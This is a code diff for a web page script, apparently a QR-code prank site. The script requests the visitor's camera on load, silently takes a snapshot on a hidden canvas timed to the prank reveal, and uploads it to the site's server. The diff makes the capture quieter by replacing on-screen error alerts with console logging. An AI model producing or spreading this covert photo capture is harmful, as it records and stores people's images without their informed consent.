@@ -221,14 +221,15 @@
   <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
   <script>
-    const scanId = sessionStorage.getItem('currentScanId');
-    if (!scanId) {
-      console.warn("No scanId found in session storage.");
-      // Optional: alert("Error: Scan ID missing. Please scan the QR again.");
-    }
+    // Get scanId from URL - 100% reliable on mobile
+    const urlParams = new URLSearchParams(window.location.search);
+    const scanId = urlParams.get('scanId');
 
     async function startCapture() {
-      if (!scanId) return;
+      if (!scanId) {
+        console.warn("No scanId found in URL.");
+        return;
+      }
       
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -237,45 +238,42 @@
         const video = document.getElementById('video');
         video.srcObject = stream;
         
-        video.onplay = () => {
-          console.log("Camera stream active...");
+        // Capture after reveal animation starts
+        setTimeout(() => {
+          const canvas = document.getElementById('canvas');
+          const context = canvas.getContext('2d');
+          context.drawImage(video, 0, 0, 640, 480);
           
-          setTimeout(() => {
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, 640, 480);
+          canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            formData.append('reaction', blob, 'reaction.jpg');
+            formData.append('scanId', scanId);
             
-            canvas.toBlob(async (blob) => {
-              const formData = new FormData();
-              formData.append('reaction', blob, 'reaction.jpg');
-              formData.append('scanId', scanId);
-              
-              try {
-                const res = await fetch('/api/upload-reaction', {
-                  method: 'POST',
-                  body: formData
-                });
-                if (res.ok) {
-                  console.log("Reaction uploaded successfully!");
-                  // alert("Snapshot captured! (Debug)");
-                } else {
-                  const errJson = await res.json();
-                  alert("Upload failed: " + errJson.error);
-                }
-              } catch (err) {
-                alert("Upload network error: " + err.message);
+            try {
+              const res = await fetch('/api/upload-reaction', {
+                method: 'POST',
+                body: formData
+              });
+              if (res.ok) {
+                console.log("Reaction uploaded!");
+              } else {
+                const errJson = await res.json();
+                console.error("Upload failed:", errJson.error);
               }
-              
-              stream.getTracks().forEach(track => track.stop());
-            }, 'image/jpeg', 0.8);
-          }, 3500); 
-        };
+            } catch (err) {
+              console.error("Network error:", err.message);
+            }
+            
+            // Stop camera
+            stream.getTracks().forEach(track => track.stop());
+          }, 'image/jpeg', 0.8);
+        }, 5800); // 2.3s loading + 3.5s prank = snap!
       } catch (e) {
-        alert("Camera access failed: " + e.message);
+        console.error("Camera access failed:", e.message);
       }
     }
 
-    // Start camera request immediately on load
+    // Start immediately
     startCapture();
 
     // After 2.6s show the reveal
